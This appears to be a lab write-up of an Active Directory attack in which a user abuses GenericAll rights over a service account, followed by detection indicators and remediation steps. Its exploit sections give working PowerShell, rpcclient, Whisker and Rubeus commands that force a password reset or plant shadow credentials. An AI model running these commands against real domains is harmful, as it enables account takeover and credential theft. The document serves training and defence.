# Attack Chain 02 — GenericAll ACL Abuse (T1098 / T1069)

**Seeded weakness:** `jdoe` holds `GenericAll` over `svc_sql`
**Tools:** PowerView / `net`, or Impacket from Linux
**Required access:** authenticated domain user `jdoe`

## 1. Recon — identify the abusive ACE

BloodHound marks the edge `jdoe -GenericAll-> svc_sql`. From PowerView on a
domain host:

```powershell
$acl = Get-Acl "AD:$((Get-ADUser svc_sql).DistinguishedName)"
$acl.Access | Where-Object IdentityReference -match 'jdoe'
```

## 2. Exploit path A — force a password reset

`GenericAll` grants `Reset-Password` rights:

```powershell
$new = ConvertTo-SecureString 'Pwn3d!2026xyz' -AsPlainText -Force
Set-ADAccountPassword -Identity svc_sql -Reset -NewPassword $new
```

Or from Linux with Impacket:

```bash
rpcclient -U 'lab.local\jdoe' //10.10.10.10 -c 'setuserinfo2 svc_sql 23 Pwn3d!2026xyz'
```

## 3. Exploit path B — shadow credentials (no password change needed)

Quieter and reversible; write an attacker-controlled Key Credential:

```powershell
# Whisker (GhostPack)
Whisker.exe add /target:svc_sql
# then authenticate with the resulting PFX via Rubeus
Rubeus.exe asktgt /user:svc_sql /certificate:<base64> /getcredentials /show
```

## 4. Impact

Control of `svc_sql` is then chained with its SPN (chain 01) and any logon
rights it holds on member servers, demonstrating a full user-to-service-account
compromise without ever touching a DC exploit.

## 5. Detection

| Source | Indicator |
|---|---|
| Security EID 4724 | Password reset performed by a non-IT-admin principal |
| Security EID 5136 | Directory service object modification adding `msDS-KeyCredentialLink` |
| Sysmon EID 1 | Execution of Whisker/Rubeus tooling (matched in sysmon-config.xml) |

## 6. Remediation

1. Remove the `GenericAll` ACE; grant least privilege (e.g. read-only where possible).
2. Monitor event 5136 for `msDS-KeyCredentialLink` changes and alert on all of them.
3. Tier administrative accounts so service-account compromise cannot reach Tier 0.
4. Quarterly ACL audits exported from BloodHound into the engagement report.
